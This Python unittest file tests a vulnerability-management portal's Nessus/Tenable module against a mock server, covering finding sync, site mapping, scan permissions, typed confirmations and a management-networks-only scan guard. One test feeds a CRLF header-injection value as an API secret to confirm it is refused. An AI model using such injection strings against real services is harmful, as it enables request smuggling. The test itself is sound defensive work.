"""Nessus module tests (Tenable Vulnerability Management, against tests/mock_tenable.py): the connection test of the API
keys, the sync (first and incremental: fixed, new, reopened), the site of scans and findings, the pages' payloads, who
may launch, stop and verify, the typed confirmation, the hard rule "management networks only" (also for administrators),
Verify fix with alt_targets, retries after 429, the proxy, the CSV export, that the secret key never leaks, and
"How to fix it" (remedy.py): the plan of every rule family from realistic Tenable outputs, only values of the finding in
the commands, the plan in the API and the CSV, and the link to Shell (only for an account with Shell and a known host).

Run from the portal folder:
    .venv/bin/python -m unittest tests.test_nessus -v
"""
import contextlib
import csv
import io
import logging
import os
import re
import shutil
import sqlite3
import sys
import tempfile
import time
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
sys.path.insert(0, HERE)

import mock_tenable  # noqa: E402

TMP = tempfile.mkdtemp()
SITES = """sites:
  DCB:
    tenable: {scanner: nessus-dcb-01, networks: ["10.248.0.0/24", "10.248.1.0/24"]}
  DCA:
    tenable: {scanner: NESSUS-DCA-01, networks: ["10.245.0.0/24", "10.245.1.0/24"]}
    hosts:
      network: {user: netops, private_key: /etc/ops-portal/keys/netops, members: {dca-oob-sw-02: 10.245.1.41}}
  DCC:
    tenable: {scanner: nessus-dcc-01, networks: ["10.243.128.0/24", "not-a-network"]}
  LAB:
    tenable: {scanner: lab-scanner-01}
"""
with open(os.path.join(TMP, "sites.yml"), "w") as f:
    f.write(SITES)
with open(os.path.join(TMP, "auth.yml"), "w") as f:
    f.write("admins: []\n")
os.environ.update(OPS_SITES=os.path.join(TMP, "sites.yml"), OPS_DATA=os.path.join(TMP, "data"),
                  OPS_DB=os.path.join(TMP, "data", "portal.db"), OPS_AUTH=os.path.join(TMP, "auth.yml"),
                  OPS_CREDENTIALS_KEY=os.path.join(TMP, "credentials.key"), OPS_MODULES="nessus,wi,shell",
                  VULNS_SYNC_HOURS="0", VULNS_EXPORT_POLL_SECONDS="0.05", VULNS_PROXY="")
ACCESS, SECRET = mock_tenable.ACCESS_KEY, mock_tenable.SECRET_KEY
TABLES = ("nessus_findings", "nessus_syncs", "nessus_trend", "nessus_meta", "portal_events")


class Capture(logging.Handler):
    def __init__(self):
        super().__init__(logging.DEBUG)
        self.lines = []

    def emit(self, record):
        self.lines.append(self.format(record))


class NessusTest(unittest.TestCase):
    answers = []   # every API answer of the tests (none may contain the secret key)

    @classmethod
    def setUpClass(cls):
        cls.mock = mock_tenable.MockTenable().start()
        os.environ["VULNS_URL"] = cls.mock.url
        cls.capture = Capture()
        logging.getLogger().addHandler(cls.capture)
        import portal_auth
        store = portal_auth.Store(os.environ["OPS_DB"])
        store.add_local_user("portaladmin", portal_auth.hash_password("demo-portal-admin"), "admin", "Admin", "", "test")
        store.add_local_user("viewer", portal_auth.hash_password("demo-viewer-1"), "operator", "Viewer", "", "test", "nessus")
        store.add_local_user("scanop", portal_auth.hash_password("demo-scanop-1"), "operator", "Scan Op", "", "test", "nessus,nessus-scan")
        store.add_local_user("allmods", portal_auth.hash_password("demo-allmods-1"), "operator", "All", "", "test", "*")
        store.add_local_user("nomod", portal_auth.hash_password("demo-nomod-1"), "operator", "No", "", "test", "wi")
        store.add_local_user("sheller", portal_auth.hash_password("demo-sheller-1"), "operator", "Sheller", "", "test", "nessus,shell")
        store.add_local_user("sheller2", portal_auth.hash_password("demo-sheller-2"), "operator", "Sheller 2", "", "test", "nessus,shell")
        import app as webapp
        from core import PORTAL
        from modules import nessus
        from modules import shell
        from modules.nessus import findings, remedy, scope, sync, tenable
        shell.access.set_rules("sheller", ["site:DCA"], "test")   # sheller2: Shell, but no host given on Shell -> Access
        cls.app, cls.PORTAL, cls.nessus = webapp.app, PORTAL, nessus
        cls.findings, cls.scope, cls.sync, cls.tenable, cls.remedy = findings, scope, sync, tenable, remedy
        cls.clients = {}

    @classmethod
    def tearDownClass(cls):
        cls.sync.wait(10)
        logging.getLogger().removeHandler(cls.capture)
        cls.mock.stop()
        shutil.rmtree(TMP, ignore_errors=True)

    def setUp(self):
        self.sync.wait(10)
        self.mock.state.reset()
        self.mock.state.run_seconds = 3600
        self.nessus.clear_cache()
        with contextlib.closing(sqlite3.connect(os.environ["OPS_DB"])) as db, db:
            for table in TABLES:
                db.execute(f"DELETE FROM {table}")
        self.PORTAL.store.set_credential("tenable", ACCESS, self.PORTAL.vault.encrypt(SECRET), "test")

    # ---- helpers ----
    def client(self, user="portaladmin"):
        if user not in self.clients:
            password = {"portaladmin": "demo-portal-admin", "viewer": "demo-viewer-1", "scanop": "demo-scanop-1",
                        "allmods": "demo-allmods-1", "nomod": "demo-nomod-1", "sheller": "demo-sheller-1",
                        "sheller2": "demo-sheller-2"}[user]
            c = self.app.test_client()
            r = c.post("/api/login", json={"username": user, "password": password})
            self.assertEqual(r.status_code, 200, r.get_json())
            self.clients[user] = c
        return self.clients[user]

    def call(self, user, method, url, status=200, **kw):
        r = getattr(self.client(user), method)(url, **kw)
        self.answers.append(r.get_data(as_text=True))
        self.assertEqual(r.status_code, status, r.get_data(as_text=True)[:500])
        return r.get_json() if r.is_json else r

    def get(self, url, user="portaladmin", status=200):
        return self.call(user, "get", url, status)

    def post(self, url, body=None, user="portaladmin", status=200):
        return self.call(user, "post", url, status, json=body if body is not None else {})

    def do_sync(self, user="portaladmin"):
        data = self.post("/vulns/api/sync", user=user)
        self.assertTrue(self.sync.wait(20), "the sync did not end")
        last = self.findings.last_sync()
        self.assertEqual(last["id"], data["id"])
        return last

    def finding(self, ip, plugin):
        with contextlib.closing(sqlite3.connect(os.environ["OPS_DB"])) as db:
            db.row_factory = sqlite3.Row
            return db.execute("SELECT * FROM nessus_findings WHERE ipv4 = ? AND plugin_id = ?", (ip, plugin)).fetchone()

    def events(self, action):
        return [e for e in self.PORTAL.store.events(500) if e["action"] == action]

    def launches(self):
        return [r for r in self.mock.state.requests if r["method"] == "POST" and r["path"].endswith("/launch")]

    # ---- credential and connection test ----
    def test_credential_target_and_test(self):
        items = {c["name"]: c for c in self.get("/api/admin/credentials")["credentials"]}
        self.assertEqual(items["tenable"]["kind"], "tenable")
        self.assertEqual(items["tenable"]["host"], f"127.0.0.1:{self.mock.port}")
        self.assertEqual(items["tenable"]["module"], "nessus")
        test = self.post("/api/admin/credentials/tenable", {"username": ACCESS, "password": SECRET})["test"]
        self.assertTrue(test["ok"], test)
        self.assertEqual(test["message"], "Connected to Tenable as svc-portal-api@example.com: 5 scanners (4 online)")
        wrong = "0" * 64
        test = self.post("/api/admin/credentials/tenable", {"username": ACCESS, "password": wrong})["test"]
        self.assertFalse(test["ok"])
        self.assertIn("refused the API keys", test["message"])
        self.assertNotIn(wrong, test["message"])
        test = self.post("/api/admin/credentials/tenable", {"username": ACCESS, "password": "bad key\r\nX-Evil: 1"})["test"]
        self.assertFalse(test["ok"])
        self.assertIn("letters and digits only", test["message"])
        self.assertNotIn("X-Evil", test["message"])

    def test_not_configured(self):
        self.PORTAL.store.remove_credential("tenable")
        s = self.get("/vulns/api/session", "viewer")
        self.assertTrue(s["allowed"])
        self.assertFalse(s["configured"])
        self.assertIn("Credentials", self.post("/vulns/api/sync", user="viewer", status=400)["error"])
        self.assertIn("not set", self.get("/vulns/api/scans", status=400)["error"])

    # ---- sync ----
    def test_sync_initial_then_incremental(self):
        t0 = time.time()
        first = self.do_sync("viewer")
        self.assertEqual(first["status"], "ok", first)
        self.assertEqual((first["received"], first["new"], first["fixed"], first["reopened"]), (33, 33, 0, 0))   # info excluded
        filters = self.mock.state.export_filters[0]
        self.assertEqual(filters["severity"], ["low", "medium", "high", "critical"])
        self.assertEqual(filters["state"], ["OPEN", "REOPENED", "FIXED"])
        self.assertAlmostEqual(filters["since"], t0 - 90 * 86400, delta=120)
        self.assertEqual(self.finding("10.245.1.40", 42873)["state"], "OPEN")
        self.assertEqual(self.finding("10.243.128.11", 104743)["state"], "FIXED")
        out = self.finding("10.245.0.25", 11213)["output"]   # longer than 8 KB at Tenable
        self.assertLessEqual(len(out.encode()), 8 * 1024 + 60)
        self.assertTrue(out.endswith("[… output truncated by the portal]"))
        second = self.do_sync("scanop")
        self.assertEqual((second["received"], second["new"], second["fixed"], second["reopened"]), (3, 1, 1, 1), second)
        since = self.mock.state.export_filters[1]["since"]
        self.assertEqual(since, self.sync._epoch(first["started"]) - 3600)   # since the last good sync, minus an hour
        fixed = self.finding("10.245.1.40", 42873)
        self.assertEqual(fixed["state"], "FIXED")
        self.assertTrue(fixed["last_fixed"].endswith("Z"))
        self.assertEqual(self.finding("10.248.0.21", 187315)["state"], "OPEN")
        self.assertEqual(self.finding("10.243.128.11", 104743)["state"], "REOPENED")
        events = self.events("nessus.sync")
        self.assertEqual(len(events), 2)
        self.assertIn("3 findings received: 1 new, 1 fixed, 1 reopened", events[0]["detail"])
        self.assertEqual(events[0]["actor"], "scanop")
        history = self.get("/vulns/api/sync")["history"]
        self.assertEqual([h["status"] for h in history], ["ok", "ok"])

    def test_state_case_and_normalise(self):
        row = self.findings.normalise({"asset": {"uuid": "u-1", "ipv4": ["10.248.0.9"], "fqdn": ["a.example"]},
                                       "plugin": {"id": "51192", "name": "X", "cve": "CVE-1"}, "port": {"port": "443", "protocol": "tcp"},
                                       "severity": "Medium", "state": "reopened", "first_found": "2026-11-01T01:02:03.456+07:00"})
        self.assertEqual((row["state"], row["severity"], row["protocol"], row["ipv4"], row["hostname"]),
                         ("REOPENED", "medium", "TCP", "10.248.0.9", "a.example"))
        self.assertEqual(row["first_found"], "2026-10-31T18:02:03Z")
        self.assertIsNone(self.findings.normalise({"asset": {"uuid": "u"}, "plugin": {}}))
        counts = self.findings.upsert([{"asset": {"uuid": "u-2", "ipv4": "10.245.0.7"}, "plugin": {"id": 5}, "state": "open",
                                        "severity": "low"}])
        self.assertEqual(counts["new"], 1)
        counts = self.findings.upsert([{"asset": {"uuid": "u-2", "ipv4": "10.245.0.7"}, "plugin": {"id": 5}, "state": "Fixed",
                                        "severity": "low", "last_fixed": "2026-11-09T00:00:00Z"}])
        self.assertEqual((counts["fixed"], counts["new"]), (1, 0))
        self.assertEqual(self.finding("10.245.0.7", 5)["site"], "DCA")

    def test_sync_failure_is_recorded(self):
        self.PORTAL.store.set_credential("tenable", ACCESS, self.PORTAL.vault.encrypt("f" * 64), "test")
        last = self.do_sync()
        self.assertEqual(last["status"], "error")
        self.assertIn("refused the API keys", last["error"])
        self.assertEqual(len(self.events("nessus.sync_failed")), 1)

    def test_auto_sync_when_due(self):
        with mock.patch.object(self.sync, "SYNC_HOURS", 6.0):
            self.assertTrue(self.sync.due())
            self.get("/vulns/api/session", "viewer")
            self.assertTrue(self.sync.wait(20))
            last = self.findings.last_sync()
            self.assertEqual((last["status"], last["reason"], last["username"]), ("ok", "auto", "viewer"))
            self.assertFalse(self.sync.due())
            self.get("/vulns/api/session", "viewer")
            self.assertEqual(len(self.findings.syncs()), 1)
            self.PORTAL.store.remove_credential("tenable")   # not configured: never by itself
            with contextlib.closing(sqlite3.connect(os.environ["OPS_DB"])) as db, db:
                db.execute("DELETE FROM nessus_syncs")
            self.get("/vulns/api/session", "viewer")
            self.assertIsNone(self.sync.running())
            self.assertEqual(self.findings.syncs(), [])

    def test_running_job_while_syncing(self):
        with mock.patch.object(self.sync, "POLL_SECONDS", 0.4):
            self.post("/vulns/api/sync")
            with self.assertRaises(self.sync.Busy):
                self.sync.start("x", self.nessus.client, lambda *a: None)
            health = self.app.test_client().get("/healthz").get_json()
            self.assertGreaterEqual(health["running"], 1)
            self.assertTrue(self.sync.wait(20))
        self.assertEqual(self.app.test_client().get("/healthz").get_json()["running"], 0)

    # ---- sites ----
    def test_site_mapping(self):
        self.do_sync()
        self.assertEqual(self.finding("10.248.1.15", 41028)["site"], "DCB")
        self.assertEqual(self.finding("10.245.1.41", 182896)["site"], "DCA")
        self.assertEqual(self.finding("10.243.128.44", 51192)["site"], "DCC")
        lab = self.finding("192.168.252.10", 41028)   # LAB has no networks, but names the scanner that found it
        self.assertEqual((lab["site"], lab["site_via"]), ("LAB", "scanner lab-scanner-01"))
        scans = {s["id"]: s for s in self.get("/vulns/api/scans")["items"]}
        self.assertEqual(scans[12]["site"], "DCA")   # scanner name in any case
        # a scan run by a scanner group names the group: tenable.groups of the site
        cfg = {"DCB": {"scanner": "tenable-scanner-dcb", "groups": ["SG-DCB"], "networks": [], "problems": []}}
        self.assertEqual(self.scope.site_of_scanner("sg-dcb", cfg), "DCB")
        self.assertEqual(self.scope.site_of_scanner("tenable-scanner-dcb", cfg), "DCB")
        self.assertEqual(self.scope.site_of_scanner("SG-DCA", cfg), "")
        self.assertEqual(scans[17]["site"], "LAB")
        self.assertNotIn(99, scans)   # in the trash
        try:   # networks change in sites.yml: the stored findings move
            with open(os.environ["OPS_SITES"], "w") as f:
                f.write(SITES.replace("{scanner: lab-scanner-01}", '{scanner: lab-scanner-01, networks: ["192.168.252.0/24"]}'))
            self.get("/vulns/api/session")
            lab = self.finding("192.168.252.10", 41028)
            self.assertEqual((lab["site"], lab["site_via"]), ("LAB", "network 192.168.252.0/24"))
            with open(os.environ["OPS_SITES"], "w") as f:   # no site names lab-scanner-01 any more: Other
                f.write(SITES.replace("{scanner: lab-scanner-01}", "{scanner: lab-scanner-02}"))
            self.get("/vulns/api/session")
            self.assertEqual(self.finding("192.168.252.10", 41028)["site"], "")
        finally:
            with open(os.environ["OPS_SITES"], "w") as f:
                f.write(SITES)
        self.get("/vulns/api/session")
        self.assertEqual(self.finding("192.168.252.10", 41028)["site"], "LAB")
        cfg = {"A": {"scanner": "", "networks": [self.scope.ipaddress.ip_network("10.0.0.0/8")], "problems": []},
               "B": {"scanner": "", "networks": [self.scope.ipaddress.ip_network("10.245.0.0/16")], "problems": []}}
        self.assertEqual(self.scope.site_of_ip("10.245.1.1", cfg), "B")   # the longest prefix
        self.assertEqual(self.scope.site_of_ip("10.244.129.1", cfg), "A")
        self.assertEqual(self.scope.site_of_ip("not-an-ip", cfg), "")

    def test_site_by_scanner_when_no_network_places_it(self):
        self.do_sync()
        n1, n2 = self.finding("10.247.136.21", 70658), self.finding("10.247.136.22", 51192)
        self.assertEqual((n1["site"], n1["site_via"], n1["scanner"]), ("DCB", "scanner nessus-dcb-01", "nessus-dcb-01"))
        self.assertEqual((n2["site"], n2["scanner"], n2["schedule_uuid"]), ("DCB", "nessus-dcb-01", ""))   # found by its run uuid
        self.assertTrue(n1["scan_started"].endswith("Z"))
        net = self.finding("10.248.0.11", 187315)
        self.assertEqual((net["site"], net["site_via"], net["scanner"]), ("DCB", "network 10.248.0.0/24", "nessus-dcb-01"))
        cloud = self.finding("203.0.113.10", 104743)   # a Tenable cloud scanner names no site: Other
        self.assertEqual((cloud["site"], cloud["site_via"], cloud["scanner"]), ("", "", "US Cloud Scanner"))
        h = self.get("/vulns/api/hosts/10.247.136.21", "viewer")
        self.assertEqual((h["site"], h["site_via"], h["scanners"]), ("DCB", "scanner nessus-dcb-01", ["nessus-dcb-01"]))
        self.assertEqual(self.get("/vulns/api/hosts/10.248.0.11")["site_via"], "network 10.248.0.0/24")
        cfg = self.scope.config()
        self.assertEqual(self.findings.place("10.245.0.25", ["nessus-dcb-01"], cfg), ("DCA", "network 10.245.0.0/24"))   # network wins
        self.assertEqual(self.findings.place("10.240.0.1", ["nessus-dcb-01", "nessus-dca-01", "NESSUS-DCA-01"], cfg),
                         ("DCA", "scanner nessus-dca-01"))   # one site per host: the one with most of its findings
        self.assertEqual(self.findings.place("10.240.0.1", ["US Cloud Scanner", ""], cfg), ("", ""))
        try:   # the scanner of a site in sites.yml changes: the findings it placed move
            with open(os.environ["OPS_SITES"], "w") as f:
                f.write(SITES.replace("scanner: nessus-dcb-01,", "scanner: nessus-dcb-99,"))
            self.get("/vulns/api/session")
            self.assertEqual(self.finding("10.247.136.21", 70658)["site"], "")
            self.assertEqual(self.finding("10.248.0.11", 187315)["site"], "DCB")   # its network still places it
        finally:
            with open(os.environ["OPS_SITES"], "w") as f:
                f.write(SITES)
        self.get("/vulns/api/session")
        self.assertEqual(self.finding("10.247.136.21", 70658)["site"], "DCB")

    def test_networks_seen_are_a_suggestion_for_administrators_only(self):
        self.do_sync()
        sites = {s["name"]: s for s in self.get("/vulns/api/overview")["sites"]}
        seen = sites["DCB"]["seen"]
        self.assertEqual((seen["scanners"], seen["guessed"], seen["missing"]), (["nessus-dcb-01"], False, ["10.247.136.0/24"]))
        self.assertIn({"network": "10.247.136.0/24", "hosts": 2, "covered": False}, seen["networks"])
        self.assertIn({"network": "10.248.0.0/24", "hosts": 3, "covered": True}, seen["networks"])
        self.assertEqual(seen["yaml"], 'tenable: {scanner: "nessus-dcb-01", groups: [], networks: ["10.248.0.0/24", "10.248.1.0/24", '
                                       '"10.247.136.0/24"]}')
        self.assertIsNone(sites["DCA"]["seen"])   # every network its scanner saw is in sites.yml
        self.assertNotIn("seen", self.get("/vulns/api/overview", "viewer")["sites"][0])
        self.assertNotIn("seen", self.get("/vulns/api/overview", "scanop")["sites"][0])
        # a site that names no scanner yet: the scanners with its name in theirs (a guess, marked so)
        names = {"nessus-dcb-01", "US Cloud Scanner", "SG-DCB"}
        guess = self.nessus.networks_suggestion("DCB", {"scanner": "", "groups": [], "networks": []}, names, {"nessus-dcb-01"})
        self.assertEqual((guess["guessed"], guess["scanners"]), (True, ["nessus-dcb-01", "SG-DCB"]))
        self.assertTrue(guess["yaml"].startswith('tenable: {scanner: "nessus-dcb-01", groups: ["SG-DCB"], networks: ['))
        self.assertEqual(self.scope.guess_scanners("DCB", ["tenable-scanner-dcb", "SG-DCB", "APAC Cloud Scanners", "dcbx-1"]),
                         ["SG-DCB", "tenable-scanner-dcb"])
        # the guard is unchanged: networks seen are not management networks until sites.yml says so
        scans = {s["id"]: s for s in self.get("/vulns/api/scans")["items"]}
        self.assertFalse(scans[19]["can_launch"])
        self.assertIn("10.247.136.0/24 (outside)", scans[19]["launch_reason"])
        self.assertIn("10.247.136.0/24 (outside)", self.post("/vulns/api/scans/19/launch", {"confirm": "DCB storage management"},
                                                         status=400)["error"])
        self.assertIn("outside the management networks of DCB", self.post("/vulns/api/scans/11/verify",
                                                                          {"ip": "10.247.136.21", "confirm": "10.247.136.21"}, status=400)["error"])
        self.assertEqual(self.launches(), [])

    def test_session_payload(self):
        self.do_sync()
        s = self.get("/vulns/api/session", "scanop")
        self.assertTrue(s["allowed"] and s["configured"] and s["can_scan"])
        self.assertFalse(s["is_admin"])
        self.assertEqual([x["name"] for x in s["sites"]], ["DCB", "DCA", "DCC", "LAB"])
        self.assertEqual(s["sites"][0], {"name": "DCB", "scanner": "nessus-dcb-01", "networks": ["10.248.0.0/24", "10.248.1.0/24"]})
        self.assertEqual(s["counts"]["DCA"], {"findings": 10, "hosts": 4})
        self.assertEqual(s["counts"][""], {"findings": 1, "hosts": 1})
        self.assertTrue(any("not-a-network" in p for p in s["problems"]))
        self.assertEqual(s["sync"]["last"]["status"], "ok")
        self.assertFalse(self.get("/vulns/api/session", "viewer")["can_scan"])
        self.assertTrue(self.get("/vulns/api/session")["can_scan"])
        self.assertFalse(self.get("/vulns/api/session", "allmods")["can_scan"])   # "all modules" never gives nessus-scan
        none = self.get("/vulns/api/session", "nomod")
        self.assertFalse(none["allowed"])
        self.assertEqual(none["sites"], [])
        anonymous = self.app.test_client().get("/vulns/api/session").get_json()
        self.assertIsNone(anonymous["user"])
        self.assertEqual(self.app.test_client().get("/vulns/api/overview").status_code, 401)

    # ---- pages ----
    def test_overview(self):
        self.do_sync()
        ov = self.get("/vulns/api/overview", "viewer")
        sites = {s["name"]: s for s in ov["sites"]}
        self.assertEqual(sites["DCB"]["active"], {"low": 4, "medium": 6, "high": 5, "critical": 0})   # 10.247.136.x by its scanner
        self.assertEqual(sites["DCA"]["active"], {"low": 1, "medium": 5, "high": 3, "critical": 1})
        self.assertEqual((sites["DCC"]["active"]["medium"], sites["DCC"]["fixed"], sites["DCC"]["reopened"]), (2, 1, 0))
        self.assertEqual(sites["DCA"]["hosts"], 4)
        self.assertEqual(sites["DCB"]["scanner_status"]["status"], "on")
        self.assertEqual(sites["DCC"]["scanner_status"]["status"], "off")
        self.assertEqual(sites["LAB"]["scanner_status"]["name"], "lab-scanner-01")
        self.assertEqual(len(sites["DCB"]["trend"]), 1)
        self.assertEqual((ov["other"]["active"]["medium"], ov["other"]["active"]["high"]), (1, 0))   # the cloud scanner's host
        self.assertEqual(ov["other"]["found_by"], [{"scanner": "US Cloud Scanner", "hosts": 1}])
        self.assertIn("US Cloud Scanner", [s["name"] for s in ov["other"]["scanners"]])
        self.do_sync()
        sites = {s["name"]: s for s in self.get("/vulns/api/overview")["sites"]}
        self.assertEqual([p["active"] for p in sites["DCA"]["trend"]], [10, 9])
        self.assertEqual([p["active"] for p in sites["DCB"]["trend"]], [15, 16])
        self.assertEqual((sites["DCC"]["reopened"], sites["DCA"]["fixed"]), (1, 1))

    def test_findings(self):
        self.do_sync()
        items = {i["plugin_id"]: i for i in self.get("/vulns/api/findings?site=DCB", "viewer")["items"]}
        self.assertEqual(items[104743]["hosts"], 2)
        self.assertEqual(items[104743]["severity"], "medium")
        self.assertNotIn(19506, items)   # info
        high = self.get("/vulns/api/findings?site=DCB&severity=high")["items"]
        self.assertEqual({i["severity"] for i in high}, {"high"})
        cve = self.get("/vulns/api/findings?site=&q=CVE-2024-6387")["items"]
        self.assertEqual([(i["plugin_id"], i["hosts"]) for i in cve], [(201194, 2)])
        named = self.get("/vulns/api/findings?site=DCB&view=list&q=dcb-xcc")
        self.assertEqual({i["ipv4"] for i in named["items"]}, {"10.248.1.15"})
        self.assertEqual(named["total"], 3)
        hosts = self.get("/vulns/api/findings?site=DCB&plugin=104743")["items"]
        self.assertEqual(sorted(i["ipv4"] for i in hosts), ["10.248.0.21", "10.248.1.15"])
        fixed = self.get("/vulns/api/findings?site=DCC&state=fixed&view=list")["items"]
        self.assertEqual(sorted((i["ipv4"], i["plugin_id"]) for i in fixed), [("10.243.128.11", 104743), ("10.243.128.44", 70658)])
        other = self.get(f"/vulns/api/findings?site={self.findings.OTHER}&view=list")["items"]
        self.assertEqual([i["ipv4"] for i in other], ["203.0.113.10"])
        self.assertEqual(self.get("/vulns/api/findings?site=XYZ", status=400)["error"], "Unknown site: XYZ")
        self.get("/vulns/api/findings?state=bogus", status=400)
        self.get("/vulns/api/findings?q=%25", status=200)   # % is text, not a wildcard

    def test_hosts_and_host(self):
        self.do_sync()
        hosts = self.get("/vulns/api/hosts?site=DCA", "viewer")["items"]
        self.assertEqual(hosts[0]["ipv4"], "10.245.1.41")   # the one with a critical first
        self.assertEqual((hosts[0]["critical"], hosts[0]["high"], hosts[0]["low"]), (1, 1, 1))
        h = self.get("/vulns/api/hosts/10.245.0.25", "viewer")
        self.assertEqual((h["site"], h["hostname"]), ("DCA", "dca-apic-1"))
        trace = next(i for i in h["items"] if i["plugin_id"] == 11213)
        self.assertIn("Disable these HTTP methods", trace["solution"])
        self.assertIn("TRACE /Nessus", trace["output"])
        self.assertEqual(h["verify"]["scans"], [])   # a viewer cannot verify: no scans read
        h = self.get("/vulns/api/hosts/10.245.0.25", "scanop")
        self.assertEqual(sorted(s["id"] for s in h["verify"]["scans"]), [12, 13])
        self.assertEqual(h["verify"]["reason"], "")
        self.get("/vulns/api/hosts/10.245.0.99", status=400)
        self.get("/vulns/api/hosts/not-an-ip", status=400)

    def test_scans_and_scan(self):
        scans = {s["id"]: s for s in self.get("/vulns/api/scans", "viewer")["items"]}
        self.assertEqual(scans[11]["schedule"], "Weekly on Sun at 02:00 (Asia/Jakarta)")
        self.assertEqual(scans[17]["schedule"], "Every 2 weeks on Mon, Thu at 22:00 (Asia/Jakarta)")
        self.assertEqual(scans[14]["schedule"], "Monthly on day 1 at 03:00 (Asia/Jakarta)")
        self.assertEqual(scans[13]["schedule"], "Not scheduled")
        self.assertTrue(scans[11]["guard"]["ok"] and scans[11]["can_launch"])
        self.assertTrue(scans[12]["guard"]["ok"])
        self.assertIn("Management networks of DCB only", scans[11]["guard"]["reason"])
        for sid, text in ((13, "11.6.148.0/24 (outside)"), (14, "10.243.128.0/22 (partly outside)"),
                          (15, "dcc-director.example.local (a host name: cannot be checked)"),
                          (16, "10.248.1.250-10.248.2.5 (partly outside)"), (17, "LAB has no management networks")):
            self.assertFalse(scans[sid]["can_launch"], sid)
            self.assertIn(text, scans[sid]["launch_reason"], sid)
        self.assertTrue(scans[11]["last_run"].endswith("Z"))
        before = len(self.mock.state.requests)
        self.get("/vulns/api/scans")   # cached
        self.assertEqual(len(self.mock.state.requests), before)
        self.do_sync()
        scan = self.get("/vulns/api/scans/12", "viewer")["scan"]
        self.assertEqual((scan["name"], scan["site"], scan["scanner"]), ("DCA management daily", "DCA", "nessus-dca-01"))
        hosts = {h["hostname"]: h for h in scan["hosts"]}
        self.assertEqual((hosts["10.245.1.41"]["critical"], hosts["10.245.1.41"]["in_portal"]), (1, True))
        self.assertEqual(len(scan["history"]), 3)
        self.assertEqual(scan["history"][0]["status"], "completed")
        self.assertEqual(self.get("/vulns/api/scans/12/status")["status"], "completed")
        self.get("/vulns/api/scans/404", status=502)

    # ---- who may launch, stop and verify ----
    def test_permissions(self):
        self.do_sync()
        for user in ("viewer", "allmods"):
            for url, body in (("/vulns/api/scans/11/launch", {"confirm": "DCB management weekly"}),
                              ("/vulns/api/scans/11/stop", {"confirm": "DCB management weekly"}),
                              ("/vulns/api/scans/12/verify", {"ip": "10.245.1.41", "confirm": "10.245.1.41"})):
                self.assertIn("Vulnerability Scans: launch and stop scans", self.post(url, body, user, 403)["error"])
        for url in ("/vulns/api/overview", "/vulns/api/findings", "/vulns/api/scans", "/vulns/api/hosts/10.245.1.41"):
            self.get(url, "nomod", 403)
        self.post("/vulns/api/scans/11/launch", {"confirm": "DCB management weekly"}, "nomod", 403)
        self.assertEqual(self.launches(), [])
        r = self.post("/vulns/api/scans/11/launch", {"confirm": "DCB management weekly"}, "scanop")
        self.assertTrue(r["scan_uuid"])
        self.assertEqual(self.launches()[-1]["body"], {})
        self.assertEqual(self.get("/vulns/api/scans/11/status")["status"], "running")
        self.assertIn("already", self.post("/vulns/api/scans/11/launch", {"confirm": "DCB management weekly"}, "scanop", 400)["error"])
        self.post("/vulns/api/scans/11/stop", {"confirm": "DCB management weekly"}, "scanop")
        self.assertEqual(self.mock.state.scans[11]["status"], "canceled")
        self.assertIn("not running", self.post("/vulns/api/scans/11/stop", {"confirm": "DCB management weekly"}, "scanop", 400)["error"])
        self.post("/vulns/api/scans/12/launch", {"confirm": "DCA management daily"})   # an administrator
        self.assertEqual([e["actor"] for e in self.events("nessus.launch")], ["portaladmin", "scanop"])
        stop = self.events("nessus.stop")[0]
        self.assertEqual((stop["actor"], stop["target"]), ("scanop", "DCB · DCB management weekly"))

    def test_typed_confirmation(self):
        self.do_sync()
        for body in ({}, {"confirm": "dcb management weekly"}, {"confirm": "DCB management"}):
            self.assertIn("Type the scan name DCB management weekly", self.post("/vulns/api/scans/11/launch", body, status=400)["error"])
        self.mock.state.scans[11]["status"] = "running"
        self.mock.state.scans[11]["launched"] = time.time()
        self.assertIn("to confirm the stop", self.post("/vulns/api/scans/11/stop", {"confirm": "x"}, status=400)["error"])
        self.mock.state.complete_all()
        self.assertIn("Type the address 10.245.1.41", self.post("/vulns/api/scans/12/verify", {"ip": "10.245.1.41"}, status=400)["error"])
        self.assertEqual(self.launches(), [])
        self.post("/vulns/api/scans/11/launch", {"confirm": "  DCB management weekly "})

    # ---- management networks only ----
    def test_management_networks_only(self):
        self.do_sync()
        for sid, name, text in ((13, "DCA customer edge (DMZ)", "11.6.148.0/24 (outside)"),
                                (14, "DCC management discovery", "10.243.128.0/22 (partly outside)"),
                                (15, "DCC directors by name", "a host name: cannot be checked"),
                                (16, "DCB out-of-band range", "10.248.1.250-10.248.2.5 (partly outside)"),
                                (17, "Lab switches", "LAB has no management networks")):
            for user in ("portaladmin", "scanop"):   # administrators too
                error = self.post(f"/vulns/api/scans/{sid}/launch", {"confirm": name}, user, 400)["error"]
                self.assertIn(text, error, sid)
        self.assertEqual(self.launches(), [])
        self.assertEqual(len(self.events("nessus.refused")), 10)
        self.post("/vulns/api/scans/11/launch", {"confirm": "DCB management weekly"})   # fully inside
        self.assertEqual(len(self.launches()), 1)
        self.assertEqual(self.events("nessus.launch")[0]["target"], "DCB · DCB management weekly")
        # a scan edited in Tenable after the list was read: the launch checks the targets as they are now
        self.mock.state.scans[12]["targets"] = "10.245.0.0/24, 8.8.8.8"
        self.assertIn("8.8.8.8 (outside)", self.post("/vulns/api/scans/12/launch", {"confirm": "DCA management daily"}, status=400)["error"])
        # asset tags (or target groups) next to the address list: hosts the portal cannot see, so never launched here
        self.mock.state.scans[11]["extra_info"] = {"tag_targets": ["0b2c6c5e-tag"]}
        self.assertIn("also targets asset tags", self.post("/vulns/api/scans/11/launch", {"confirm": "DCB management weekly"}, status=400)["error"])
        self.assertEqual(len(self.launches()), 1)

    def test_scope_rules(self):
        net = self.scope.ipaddress.ip_network
        cfg = {"S": {"scanner": "sc", "networks": [net("10.248.0.0/24"), net("10.248.1.0/24")], "problems": []},
               "E": {"scanner": "se", "networks": [], "problems": []}}
        ok = lambda t: self.scope.check_scan("S", t, cfg)["ok"]   # noqa: E731
        self.assertTrue(ok("10.248.0.5, 10.248.0.0/25\n10.248.1.7-10.248.1.9;10.248.0.5-20"))
        self.assertTrue(ok("10.248.0.0/23"))   # two neighbouring networks cover it
        self.assertTrue(ok("10.248.0.200-10.248.1.10"))
        self.assertFalse(ok("10.248.0.5, 8.8.8.8"))
        self.assertFalse(ok("10.248.0.0/22"))   # larger than the networks
